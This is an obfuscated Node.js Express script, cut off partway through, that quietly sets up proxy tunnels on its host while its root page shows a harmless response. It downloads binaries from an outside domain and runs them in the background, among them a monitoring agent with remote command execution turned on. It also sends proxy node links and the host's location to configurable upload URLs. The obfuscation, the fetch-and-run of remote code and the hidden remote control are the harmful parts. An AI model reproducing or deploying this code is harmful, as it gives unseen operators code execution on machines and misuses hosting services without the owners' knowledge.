const _0x5684ca=_0x5297;(function(_0x1ad106,_0x2d9769){const _0x17a705={_0x58ab27:0xbc,_0x3b4026:0xb7,_0x5616f5:0x13e,_0x41cf1d:0xee,_0x46f320:0xa4,_0x222ce1:0x11e,_0xf16fb5:0xe6},_0x173dfc=_0x5297,_0x272842=_0x1ad106();while(!![]){try{const _0x365448=parseInt(_0x173dfc(0xa0))/0x1+-parseInt(_0x173dfc(_0x17a705._0x58ab27))/0x2*(-parseInt(_0x173dfc(_0x17a705._0x3b4026))/0x3)+parseInt(_0x173dfc(0xb6))/0x4+-parseInt(_0x173dfc(0x136))/0x5+parseInt(_0x173dfc(_0x17a705._0x5616f5))/0x6+parseInt(_0x173dfc(_0x17a705._0x41cf1d))/0x7*(-parseInt(_0x173dfc(_0x17a705._0x46f320))/0x8)+parseInt(_0x173dfc(_0x17a705._0x222ce1))/0x9*(-parseInt(_0x173dfc(_0x17a705._0xf16fb5))/0xa);if(_0x365448===_0x2d9769)break;else _0x272842['push'](_0x272842['shift']());}catch(_0x4b140e){_0x272842['push'](_0x272842['shift']());}}}(_0x23b4,0x7bb6a));const express=require('express'),app=express(),axios=require(_0x5684ca(0x8f)),os=require('os'),fs=require('fs'),path=require(_0x5684ca(0x107)),{promisify}=require(_0x5684ca(0xfb)),exec=promisify(require(_0x5684ca(0xff))['exec']),{execSync}=require(_0x5684ca(0xff)),UPLOAD_URL=process[_0x5684ca(0x98)][_0x5684ca(0x97)]||'',PROJECT_URL=process[_0x5684ca(0x98)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x5684ca(0x98)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x5684ca(0x98)][_0x5684ca(0xaa)]||_0x5684ca(0x11d),SUB_PATH=process[_0x5684ca(0x98)][_0x5684ca(0x80)]||_0x5684ca(0x12b),PORT=process[_0x5684ca(0x98)][_0x5684ca(0xe8)]||process[_0x5684ca(0x98)][_0x5684ca(0x88)]||0xbb8,UUID=process['env'][_0x5684ca(0x114)]||_0x5684ca(0xdf),NEZHA_SERVER=process[_0x5684ca(0x98)][_0x5684ca(0xb8)]||'',NEZHA_PORT=process['env'][_0x5684ca(0x13f)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process['env'][_0x5684ca(0x106)]||'argo.llliii.dpdns.org',ARGO_AUTH=process[_0x5684ca(0x98)][_0x5684ca(0x125)]||_0x5684ca(0x141),ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process['env']['CFIP']||_0x5684ca(0x132),CFPORT=process[_0x5684ca(0x98)]['CFPORT']||0x1bb,NAME=process[_0x5684ca(0x98)][_0x5684ca(0xed)]||_0x5684ca(0x10e);!fs['existsSync'](FILE_PATH)?(fs[_0x5684ca(0x12a)](FILE_PATH),console[_0x5684ca(0xec)](FILE_PATH+_0x5684ca(0xa5))):console[_0x5684ca(0xec)](FILE_PATH+_0x5684ca(0x11c));function generateRandomName(){const _0x350141={_0x59b06a:0x9a},_0x46de59=_0x5684ca,_0x18417c=_0x46de59(0x116);let _0x3237b7='';for(let _0x3cdd73=0x0;_0x3cdd73<0x6;_0x3cdd73++){_0x3237b7+=_0x18417c[_0x46de59(0x10c)](Math[_0x46de59(_0x350141._0x59b06a)](Math[_0x46de59(0x90)]()*_0x18417c['length']));}return _0x3237b7;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x5684ca(0xf9)](FILE_PATH,npmName),phpPath=path[_0x5684ca(0xf9)](FILE_PATH,phpName),webPath=path[_0x5684ca(0xf9)](FILE_PATH,webName),botPath=path[_0x5684ca(0xf9)](FILE_PATH,botName),subPath=path[_0x5684ca(0xf9)](FILE_PATH,_0x5684ca(0xdc)),listPath=path[_0x5684ca(0xf9)](FILE_PATH,_0x5684ca(0xd9)),bootLogPath=path[_0x5684ca(0xf9)](FILE_PATH,_0x5684ca(0xc4)),configPath=path['join'](FILE_PATH,_0x5684ca(0x112));function deleteNodes(){const _0x4bcdbc={_0x103f34:0xad,_0x47e3c9:0x111,_0x11a5a2:0xd0,_0x5b47d6:0x105,_0x198b88:0xdb,_0x22bdc8:0x117},_0x919a46=_0x5684ca;try{if(!UPLOAD_URL)return;if(!fs[_0x919a46(_0x4bcdbc._0x103f34)](subPath))return;let _0x154770;try{_0x154770=fs['readFileSync'](subPath,_0x919a46(_0x4bcdbc._0x47e3c9));}catch{return null;}const _0x4ac38e=Buffer[_0x919a46(_0x4bcdbc._0x11a5a2)](_0x154770,_0x919a46(0x113))[_0x919a46(_0x4bcdbc._0x5b47d6)](_0x919a46(0x111)),_0x42324f=_0x4ac38e[_0x919a46(_0x4bcdbc._0x198b88)]('\x0a')['filter'](_0xf32062=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x919a46(0xbb)](_0xf32062));if(_0x42324f[_0x919a46(0xdd)]===0x0)return;return axios[_0x919a46(0x8e)](UPLOAD_URL+_0x919a46(0x95),JSON['stringify']({'nodes':_0x42324f}),{'headers':{'Content-Type':_0x919a46(0x9d)}})[_0x919a46(_0x4bcdbc._0x22bdc8)](_0xe876=>{return null;}),null;}catch(_0xa10351){return null;}}function cleanupOldFiles(){const _0x48e133={_0x5765a1:0xd7},_0x2b7f6d=_0x5684ca;try{const _0x4ea150=fs[_0x2b7f6d(0x83)](FILE_PATH);_0x4ea150[_0x2b7f6d(0x11a)](_0x4c9ea4=>{const _0x5d51a0=_0x2b7f6d,_0x599d3e=path[_0x5d51a0(0xf9)](FILE_PATH,_0x4c9ea4);try{const _0x208f37=fs[_0x5d51a0(_0x48e133._0x5765a1)](_0x599d3e);_0x208f37[_0x5d51a0(0xe1)]()&&fs['unlinkSync'](_0x599d3e);}catch(_0x30b754){}});}catch(_0x512300){}}app[_0x5684ca(0x8d)]('/',function(_0x58f4c1,_0x449975){const _0x461a50={_0x57fe00:0x134},_0x293dd0=_0x5684ca;_0x449975['send'](_0x293dd0(_0x461a50._0x57fe00));});async function generateConfig(){const _0x126f66={_0xac9247:0xc2,_0x2cbc2d:0x12f,_0x16983c:0x124,_0x1f743d:0xa6,_0x48c81a:0xeb,_0x2febca:0x124,_0x49930f:0x9c,_0x2f82a6:0xac,_0x402456:0x85,_0x4a7068:0xd4,_0x441b47:0xeb,_0x442c35:0x121,_0x72b89:0xcf,_0x28e598:0xfe,_0x1c08d8:0xe7,_0x20bc13:0xf9,_0x3e949f:0x112},_0x2af62a=_0x5684ca,_0x38ec88={'log':{'access':_0x2af62a(0xc2),'error':_0x2af62a(_0x126f66._0xac9247),'loglevel':_0x2af62a(0xeb)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2af62a(_0x126f66._0x2cbc2d),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x2af62a(0xeb),'fallbacks':[{'dest':0xbb9},{'path':_0x2af62a(_0x126f66._0x16983c),'dest':0xbba},{'path':_0x2af62a(_0x126f66._0x1f743d),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x2af62a(0x85),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x2af62a(0xeb)},'streamSettings':{'network':_0x2af62a(0xca),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x2af62a(0x12f),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2af62a(_0x126f66._0x48c81a)},'streamSettings':{'network':'ws','security':_0x2af62a(_0x126f66._0x48c81a),'wsSettings':{'path':_0x2af62a(_0x126f66._0x2febca)}},'sniffing':{'enabled':!![],'destOverride':[_0x2af62a(0x102),'tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2af62a(0x85),'protocol':_0x2af62a(0xf8),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2af62a(0xa6)}},'sniffing':{'enabled':!![],'destOverride':[_0x2af62a(0x102),_0x2af62a(_0x126f66._0x49930f),_0x2af62a(_0x126f66._0x2f82a6)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2af62a(_0x126f66._0x402456),'protocol':_0x2af62a(_0x126f66._0x4a7068),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2af62a(_0x126f66._0x441b47),'wsSettings':{'path':_0x2af62a(0x128)}},'sniffing':{'enabled':!![],'destOverride':[_0x2af62a(0x102),_0x2af62a(0x9c),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x2af62a(_0x126f66._0x442c35)]},'outbounds':[{'protocol':_0x2af62a(0xa7),'tag':_0x2af62a(_0x126f66._0x72b89)},{'protocol':_0x2af62a(_0x126f66._0x28e598),'tag':_0x2af62a(0x119)}]};fs[_0x2af62a(_0x126f66._0x1c08d8)](path[_0x2af62a(_0x126f66._0x20bc13)](FILE_PATH,_0x2af62a(_0x126f66._0x3e949f)),JSON['stringify'](_0x38ec88,null,0x2));}function getSystemArchitecture(){const _0x400464={_0x9321b4:0xd8},_0x565346=_0x5684ca,_0x54ee0c=os[_0x565346(0xfa)]();return _0x54ee0c===_0x565346(0x103)||_0x54ee0c===_0x565346(_0x400464._0x9321b4)||_0x54ee0c===_0x565346(0x96)?_0x565346(0x103):'amd';}function downloadFile(_0x7a8de5,_0x180ed2,_0x4b30ad){const _0x310f64={_0x509e19:0xb5},_0x757591={_0x334ead:0x12e,_0x83aaa3:0xbd,_0xf13d:0xe5,_0xfde19b:0x7f},_0x3c8fdb={_0x52702b:0xba},_0x5920da=_0x5684ca,_0x3486f2=_0x7a8de5;!fs[_0x5920da(0xad)](FILE_PATH)&&fs[_0x5920da(0x12a)](FILE_PATH,{'recursive':!![]});const _0x17c9ac=fs[_0x5920da(_0x310f64._0x509e19)](_0x3486f2);axios({'method':_0x5920da(0x8d),'url':_0x180ed2,'responseType':'stream'})[_0x5920da(0xa3)](_0x2729f5=>{const _0x4d2fff={_0x380fd8:0x9f,_0xa34ed9:0xe5},_0x526048={_0xfbe611:0xc0,_0x5b0bd8:0x9f,_0x301e03:0x12e,_0x2a0ded:0xc7},_0x4f91fa=_0x5920da;_0x2729f5[_0x4f91fa(0x122)][_0x4f91fa(_0x3c8fdb._0x52702b)](_0x17c9ac),_0x17c9ac['on']('finish',()=>{const _0x25adf8=_0x4f91fa;_0x17c9ac[_0x25adf8(_0x526048._0xfbe611)](),console['log'](_0x25adf8(_0x526048._0x5b0bd8)+path[_0x25adf8(_0x526048._0x301e03)](_0x3486f2)+_0x25adf8(_0x526048._0x2a0ded)),_0x4b30ad(null,_0x3486f2);}),_0x17c9ac['on']('error',_0x5ea55a=>{const _0x1d4218=_0x4f91fa;fs['unlink'](_0x3486f2,()=>{});const _0x55ca22=_0x1d4218(_0x4d2fff._0x380fd8)+path[_0x1d4218(0x12e)](_0x3486f2)+'\x20failed:\x20'+_0x5ea55a[_0x1d4218(_0x4d2fff._0xa34ed9)];console[_0x1d4218(0x7f)](_0x55ca22),_0x4b30ad(_0x55ca22);});})['catch'](_0x508a17=>{const _0x1045dc=_0x5920da,_0x578e4a=_0x1045dc(0x9f)+path[_0x1045dc(_0x757591._0x334ead)](_0x3486f2)+_0x1045dc(_0x757591._0x83aaa3)+_0x508a17[_0x1045dc(_0x757591._0xf13d)];console[_0x1045dc(_0x757591._0xfde19b)](_0x578e4a),_0x4b30ad(_0x578e4a);});}async function downloadFilesAndRun(){const _0x10758c={_0x4d2fe6:0xdd,_0x260be9:0xec,_0x4b8fab:0x92,_0x45b25a:0xdb,_0x3ef244:0x130,_0x3373b5:0x82,_0x3b8a30:0xfd,_0x12880a:0xa9,_0x71588d:0x133,_0x2baf4e:0xe7,_0x1f126f:0x100,_0x14bec6:0xec,_0x1bd359:0x7f,_0x47f1bb:0x8a,_0x1cde96:0x82,_0x526c99:0x81,_0x3d2169:0x100,_0x44044b:0xc5,_0x4fc820:0x9e,_0x4f3f0b:0xab,_0x542904:0x13d,_0x465cd4:0xf0,_0x202acd:0xce,_0x16a96e:0x7e,_0x1b85c4:0xe0,_0x1b0af3:0xf3,_0xc13e07:0xec,_0xc9fd92:0x9e},_0x434da7={_0xc01804:0x11a},_0x2b7bdc=_0x5684ca,_0x32b8dd=getSystemArchitecture(),_0x37a9bd=getFilesForArchitecture(_0x32b8dd);if(_0x37a9bd[_0x2b7bdc(_0x10758c._0x4d2fe6)]===0x0){console[_0x2b7bdc(_0x10758c._0x260be9)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x5f37b4=_0x37a9bd[_0x2b7bdc(_0x10758c._0x4b8fab)](_0xc5bbc5=>{return new Promise((_0x4ecd3e,_0x2f3484)=>{const _0x4dbd75=_0x5297;downloadFile(_0xc5bbc5[_0x4dbd75(0xb9)],_0xc5bbc5[_0x4dbd75(0x10b)],(_0xa301ae,_0x1f0fdf)=>{_0xa301ae?_0x2f3484(_0xa301ae):_0x4ecd3e(_0x1f0fdf);});});});try{await Promise[_0x2b7bdc(0x89)](_0x5f37b4);}catch(_0x2493bd){console['error'](_0x2b7bdc(0xfc),_0x2493bd);return;}function _0x1f5843(_0x27c2d1){const _0x1a092a={_0x374d72:0xad},_0x450537=_0x2b7bdc,_0x31be28=0x1fd;_0x27c2d1[_0x450537(_0x434da7._0xc01804)](_0x66cab5=>{const _0x4872b0={_0x60f1d0:0x7f,_0x1976cc:0x123,_0x1e420f:0x138,_0x4b3122:0x105},_0x3df355=_0x450537;fs[_0x3df355(_0x1a092a._0x374d72)](_0x66cab5)&&fs['chmod'](_0x66cab5,_0x31be28,_0x2441ec=>{const _0x41fe9a=_0x3df355;_0x2441ec?console[_0x41fe9a(_0x4872b0._0x60f1d0)](_0x41fe9a(_0x4872b0._0x1976cc)+_0x66cab5+':\x20'+_0x2441ec):console[_0x41fe9a(0xec)](_0x41fe9a(_0x4872b0._0x1e420f)+_0x66cab5+':\x20'+_0x31be28[_0x41fe9a(_0x4872b0._0x4b3122)](0x8));});});}const _0x511f40=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1f5843(_0x511f40);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2edb73=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x2b7bdc(_0x10758c._0x45b25a)](':')[_0x2b7bdc(_0x10758c._0x3ef244)]():'',_0x1550da=new Set([_0x2b7bdc(_0x10758c._0x3373b5),_0x2b7bdc(_0x10758c._0x3b8a30),'2096',_0x2b7bdc(0x81),'2083',_0x2b7bdc(0x126)]),_0xcff9c2=_0x1550da[_0x2b7bdc(_0x10758c._0x12880a)](_0x2edb73)?_0x2b7bdc(0xd3):_0x2b7bdc(_0x10758c._0x71588d),_0x3e7360=_0x2b7bdc(0x101)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0xcff9c2+_0x2b7bdc(0xef)+UUID;fs[_0x2b7bdc(_0x10758c._0x2baf4e)](path[_0x2b7bdc(0xf9)](FILE_PATH,_0x2b7bdc(0x10a)),_0x3e7360);const _0x512043=_0x2b7bdc(_0x10758c._0x1f126f)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x2b7bdc(0x131);try{await exec(_0x512043),console[_0x2b7bdc(_0x10758c._0x14bec6)](phpName+_0x2b7bdc(0x9e)),await new Promise(_0x4940a=>setTimeout(_0x4940a,0x3e8));}catch(_0x3f96bd){console[_0x2b7bdc(_0x10758c._0x1bd359)](_0x2b7bdc(_0x10758c._0x47f1bb)+_0x3f96bd);}}else{let _0x1fa4d9='';const _0x3f63f7=[_0x2b7bdc(_0x10758c._0x1cde96),_0x2b7bdc(_0x10758c._0x3b8a30),_0x2b7bdc(0x13c),_0x2b7bdc(_0x10758c._0x526c99),'2083','2053'];_0x3f63f7['includes'](NEZHA_PORT)&&(_0x1fa4d9=_0x2b7bdc(0xf4));const _0x37d5e9=_0x2b7bdc(_0x10758c._0x3d2169)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x2b7bdc(0xb4)+NEZHA_KEY+'\x20'+_0x1fa4d9+_0x2b7bdc(_0x10758c._0x44044b);try{await exec(_0x37d5e9),console[_0x2b7bdc(_0x10758c._0x260be9)](npmName+_0x2b7bdc(_0x10758c._0x4fc820)),await new Promise(_0x233796=>setTimeout(_0x233796,0x3e8));}catch(_0x518339){console[_0x2b7bdc(0x7f)](_0x2b7bdc(0x8b)+_0x518339);}}}else console[_0x2b7bdc(0xec)](_0x2b7bdc(0x94));const _0x1c3979=_0x2b7bdc(_0x10758c._0x3d2169)+webPath+_0x2b7bdc(0xe4)+FILE_PATH+_0x2b7bdc(_0x10758c._0x4f3f0b);try{await exec(_0x1c3979),console[_0x2b7bdc(_0x10758c._0x260be9)](webName+'\x20is\x20running'),await new Promise(_0x5c4959=>setTimeout(_0x5c4959,0x3e8));}catch(_0x36bd04){console[_0x2b7bdc(_0x10758c._0x1bd359)](_0x2b7bdc(0x10d)+_0x36bd04);}if(fs[_0x2b7bdc(0xad)](botPath)){let _0x370f70;if(ARGO_AUTH[_0x2b7bdc(_0x10758c._0x542904)](/^[A-Z0-9a-z=]{120,250}$/))_0x370f70=_0x2b7bdc(_0x10758c._0x465cd4)+ARGO_AUTH;else ARGO_AUTH[_0x2b7bdc(0x13d)](/TunnelSecret/)?_0x370f70=_0x2b7bdc(_0x10758c._0x202acd)+FILE_PATH+_0x2b7bdc(_0x10758c._0x16a96e):_0x370f70=_0x2b7bdc(_0x10758c._0x1b85c4)+FILE_PATH+_0x2b7bdc(0x13a)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x370f70+_0x2b7bdc(_0x10758c._0x1b0af3)),console[_0x2b7bdc(_0x10758c._0xc13e07)](botName+_0x2b7bdc(_0x10758c._0xc9fd92)),await new Promise(_0x341e0d=>setTimeout(_0x341e0d,0x7d0));}catch(_0x4b0766){console[_0x2b7bdc(0x7f)](_0x2b7bdc(0x7d)+_0x4b0766);}}await new Promise(_0x52b0ba=>setTimeout(_0x52b0ba,0x1388));}function _0x5297(_0xdc12ab,_0x3ead8b){const _0x23b450=_0x23b4();return _0x5297=function(_0x529706,_0x4ac520){_0x529706=_0x529706-0x7c;let _0x3ee6c9=_0x23b450[_0x529706];return _0x3ee6c9;},_0x5297(_0xdc12ab,_0x3ead8b);}function getFilesForArchitecture(_0x4753d3){const _0x515453={_0x12d5fd:0x103,_0x4fb4ca:0x87,_0xa17de0:0xd5,_0x487b13:0x11b,_0x1f2c53:0xd1},_0x5e6d1b=_0x5684ca;let _0x2f627c;_0x4753d3===_0x5e6d1b(_0x515453._0x12d5fd)?_0x2f627c=[{'fileName':webPath,'fileUrl':_0x5e6d1b(_0x515453._0x4fb4ca)},{'fileName':botPath,'fileUrl':_0x5e6d1b(_0x515453._0xa17de0)}]:_0x2f627c=[{'fileName':webPath,'fileUrl':_0x5e6d1b(_0x515453._0x487b13)},{'fileName':botPath,'fileUrl':_0x5e6d1b(0x139)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3c38c1=_0x4753d3==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x5e6d1b(_0x515453._0x1f2c53);_0x2f627c[_0x5e6d1b(0xc8)]({'fileName':npmPath,'fileUrl':_0x3c38c1});}else{const _0x279bba=_0x4753d3==='arm'?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x2f627c['unshift']({'fileName':phpPath,'fileUrl':_0x279bba});}}return _0x2f627c;}function argoType(){const _0x3c9ae6={_0x5cc432:0xec,_0x3f192b:0x118,_0x31240b:0xc9,_0x102708:0x84,_0x2c237b:0xf9},_0x3d5355=_0x5684ca;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3d5355(_0x3c9ae6._0x5cc432)](_0x3d5355(_0x3c9ae6._0x3f192b));return;}if(ARGO_AUTH[_0x3d5355(0x108)](_0x3d5355(0x109))){fs[_0x3d5355(0xe7)](path[_0x3d5355(0xf9)](FILE_PATH,_0x3d5355(_0x3c9ae6._0x31240b)),ARGO_AUTH);const _0x48f0c2=_0x3d5355(_0x3c9ae6._0x102708)+ARGO_AUTH['split']('\x22')[0xb]+_0x3d5355(0x137)+path[_0x3d5355(_0x3c9ae6._0x2c237b)](FILE_PATH,_0x3d5355(_0x3c9ae6._0x31240b))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x3d5355(_0x3c9ae6._0x2c237b)](FILE_PATH,_0x3d5355(0x110)),_0x48f0c2);}else console['log'](_0x3d5355(0x115));}async function extractDomains(){const _0x38b0ff={_0x14f63a:0x135,_0xe8d536:0xf1,_0x4f0362:0xf9,_0x407917:0xc4,_0x3ef417:0x111,_0x167258:0xec,_0x94b344:0xea,_0xbf55f1:0xde,_0x39a49d:0x7f},_0x1db7bc={_0x32c799:0x129,_0x21beae:0x122,_0x126ae2:0xf7,_0x17c789:0x122,_0x38105e:0xc6,_0x341fd0:0xb2,_0x149505:0x127},_0x53cb66={_0x57de79:0xa2,_0x129003:0xc3},_0x50f750=_0x5684ca;let _0x44e988;if(ARGO_AUTH&&ARGO_DOMAIN)_0x44e988=ARGO_DOMAIN,console['log'](_0x50f750(_0x38b0ff._0x14f63a),_0x44e988),await _0x4762ed(_0x44e988);else try{const _0x166bd6=fs[_0x50f750(_0x38b0ff._0xe8d536)](path[_0x50f750(_0x38b0ff._0x4f0362)](FILE_PATH,_0x50f750(_0x38b0ff._0x407917)),_0x50f750(_0x38b0ff._0x3ef417)),_0x53bb0d=_0x166bd6['split']('\x0a'),_0x10497b=[];_0x53bb0d['forEach'](_0x36b06a=>{const _0x36bb4f=_0x50f750,_0x3a6659=_0x36b06a[_0x36bb4f(0x13d)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3a6659){const _0x130044=_0x3a6659[0x1];_0x10497b['push'](_0x130044);}});if(_0x10497b['length']>0x0)_0x44e988=_0x10497b[0x0],console[_0x50f750(_0x38b0ff._0x167258)](_0x50f750(_0x38b0ff._0x94b344),_0x44e988),await _0x4762ed(_0x44e988);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x50f750(_0x38b0ff._0xbf55f1)](path[_0x50f750(0xf9)](FILE_PATH,_0x50f750(0xc4)));async function _0x4da091(){const _0xe898bc=_0x50f750;try{process[_0xe898bc(0xe9)]==='win32'?await exec(_0xe898bc(_0x53cb66._0x57de79)+botName+_0xe898bc(0x12d)):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0xe898bc(_0x53cb66._0x129003)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x220857){}}_0x4da091(),await new Promise(_0x190983=>setTimeout(_0x190983,0xbb8));const _0x87f60d=_0x50f750(0xe0)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x50f750(0x100)+botPath+'\x20'+_0x87f60d+'\x20>/dev/null\x202>&1\x20&'),console[_0x50f750(_0x38b0ff._0x167258)](botName+'\x20is\x20running'),await new Promise(_0x53e54c=>setTimeout(_0x53e54c,0xbb8)),await extractDomains();}catch(_0x1d8164){console[_0x50f750(_0x38b0ff._0x39a49d)](_0x50f750(0x7d)+_0x1d8164);}}}catch(_0x27be3e){console[_0x50f750(_0x38b0ff._0x39a49d)](_0x50f750(0xcc),_0x27be3e);}async function _0x9974eb(){const _0x1d9dce=_0x50f750;try{const _0xb43571=await axios[_0x1d9dce(0x8d)](_0x1d9dce(_0x1db7bc._0x32c799),{'timeout':0xbb8});if(_0xb43571[_0x1d9dce(_0x1db7bc._0x21beae)]&&_0xb43571[_0x1d9dce(_0x1db7bc._0x21beae)][_0x1d9dce(_0x1db7bc._0x126ae2)]&&_0xb43571[_0x1d9dce(_0x1db7bc._0x17c789)][_0x1d9dce(0xc6)])return _0xb43571[_0x1d9dce(0x122)][_0x1d9dce(0xf7)]+'_'+_0xb43571[_0x1d9dce(0x122)][_0x1d9dce(_0x1db7bc._0x38105e)];}catch(_0x4a8195){try{const _0x3b887b=await axios['get']('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x3b887b[_0x1d9dce(0x122)]&&_0x3b887b[_0x1d9dce(_0x1db7bc._0x17c789)]['status']===_0x1d9dce(_0x1db7bc._0x341fd0)&&_0x3b887b[_0x1d9dce(0x122)]['countryCode']&&_0x3b887b['data'][_0x1d9dce(0xc6)])return _0x3b887b[_0x1d9dce(0x122)][_0x1d9dce(_0x1db7bc._0x149505)]+'_'+_0x3b887b['data'][_0x1d9dce(0xc6)];}catch(_0x15a994){}}return'Unknown';}async function _0x4762ed(_0x26af41){const _0x32b2c8=await _0x9974eb(),_0x4052ae=NAME?NAME+'-'+_0x32b2c8:_0x32b2c8;return new Promise(_0x5bdfb4=>{const _0x10d168={_0x216958:0xeb,_0x3fa400:0xd2,_0x29c3be:0xbe,_0x338951:0x12c,_0x57a1e8:0x8c,_0x187547:0x7c,_0x1556af:0xe2,_0x18bdae:0xcd,_0x4e24a4:0x105,_0x286cb0:0x113,_0x4f9bb2:0x99,_0xae59ab:0xd0,_0x2bf612:0xe7,_0x5d3d10:0xd0,_0x50c50e:0x8d},_0x18aae2={_0x4695f4:0xf6,_0x515c75:0xae};setTimeout(()=>{const _0x25e27f=_0x5297,_0x3b634e={'v':'2','ps':''+_0x4052ae,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x25e27f(0xeb),'net':'ws','type':_0x25e27f(_0x10d168._0x216958),'host':_0x26af41,'path':_0x25e27f(_0x10d168._0x3fa400),'tls':_0x25e27f(0x9c),'sni':_0x26af41,'alpn':'','fp':_0x25e27f(_0x10d168._0x29c3be)},_0x43a3cc=_0x25e27f(_0x10d168._0x338951)+UUID+'@'+CFIP+':'+CFPORT+_0x25e27f(_0x10d168._0x57a1e8)+_0x26af41+_0x25e27f(_0x10d168._0x187547)+_0x26af41+_0x25e27f(_0x10d168._0x1556af)+_0x4052ae+_0x25e27f(_0x10d168._0x18bdae)+Buffer['from'](JSON['stringify'](_0x3b634e))[_0x25e27f(_0x10d168._0x4e24a4)](_0x25e27f(_0x10d168._0x286cb0))+_0x25e27f(0xda)+UUID+'@'+CFIP+':'+CFPORT+_0x25e27f(0x10f)+_0x26af41+_0x25e27f(0x7c)+_0x26af41+_0x25e27f(_0x10d168._0x4f9bb2)+_0x4052ae+'\x0a\x20\x20\x20\x20';console['log'](Buffer[_0x25e27f(_0x10d168._0xae59ab)](_0x43a3cc)[_0x25e27f(_0x10d168._0x4e24a4)](_0x25e27f(0x113))),fs[_0x25e27f(_0x10d168._0x2bf612)](subPath,Buffer[_0x25e27f(_0x10d168._0x5d3d10)](_0x43a3cc)['toString']('base64')),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x25e27f(_0x10d168._0x50c50e)]('/'+SUB_PATH,(_0x51ed83,_0xf631a7)=>{const _0x50b625=_0x25e27f,_0xec2d00=Buffer['from'](_0x43a3cc)['toString']('base64');_0xf631a7['set'](_0x50b625(_0x18aae2._0x4695f4),'text/plain;\x20charset=utf-8'),_0xf631a7[_0x50b625(_0x18aae2._0x515c75)](_0xec2d00);}),_0x5bdfb4(_0x43a3cc);},0x7d0);});}}async function uploadNodes(){const _0x139f88={_0x443762:0x8e,_0x53754a:0x9d,_0x3a412d:0xec,_0x2a0347:0xb0,_0x3c25c6:0x111,_0x11ede9:0xa1},_0x474077=_0x5684ca;if(UPLOAD_URL&&PROJECT_URL){const _0x16d08a=PROJECT_URL+'/'+SUB_PATH,_0x3fde88={'subscription':[_0x16d08a]};try{const _0x1d86de=await axios[_0x474077(_0x139f88._0x443762)](UPLOAD_URL+_0x474077(0x86),_0x3fde88,{'headers':{'Content-Type':_0x474077(_0x139f88._0x53754a)}});return _0x1d86de&&_0x1d86de['status']===0xc8?(console[_0x474077(_0x139f88._0x3a412d)](_0x474077(0xbf)),_0x1d86de):null;}catch(_0x56e3a2){if(_0x56e3a2[_0x474077(0x13b)]){if(_0x56e3a2['response'][_0x474077(_0x139f88._0x2a0347)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x474077(0xad)](listPath))return;const _0x2b8a8a=fs['readFileSync'](listPath,_0x474077(_0x139f88._0x3c25c6)),_0x1961e7=_0x2b8a8a[_0x474077(0xdb)]('\x0a')[_0x474077(0xb3)](_0x4d69db=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4d69db));if(_0x1961e7[_0x474077(0xdd)]===0x0)return;const _0x5e2d77=JSON[_0x474077(0xcb)]({'nodes':_0x1961e7});try{const _0x2d2638=await 